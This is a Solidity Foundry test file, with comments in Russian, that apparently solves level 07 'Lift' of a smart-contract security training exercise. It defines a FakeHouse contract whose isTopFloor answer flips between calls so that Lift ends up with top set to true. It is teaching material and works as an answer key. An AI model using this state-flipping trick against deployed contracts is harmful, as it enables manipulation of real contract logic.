// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/07_Lift/Lift.sol";

// Запуск теста: forge test --match-contract LiftTest
contract LiftTest is BaseTest {
    Lift private liftInstance;
    FakeHouse private exploitInstance;

    function setUp() public override {
        super.setUp();
        liftInstance = new Lift();
        exploitInstance = new FakeHouse();
    }

    function testExploitLevel() public {
        // Устанавливаем вызов от имени Exploit контракта
        vm.prank(address(exploitInstance));

        // Пытаемся вызвать функцию goToFloor
        liftInstance.goToFloor(0);

        // Проверяем успешность атаки
       checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(liftInstance.top(), "Solution is not solving the level");
    }
}

contract FakeHouse is House {
    uint256 private callCounter;

    function isTopFloor(uint256) external override returns (bool) {
        callCounter++;

        // Возвращает true, начиная с второго вызова
        return callCounter > 1;
    }
}

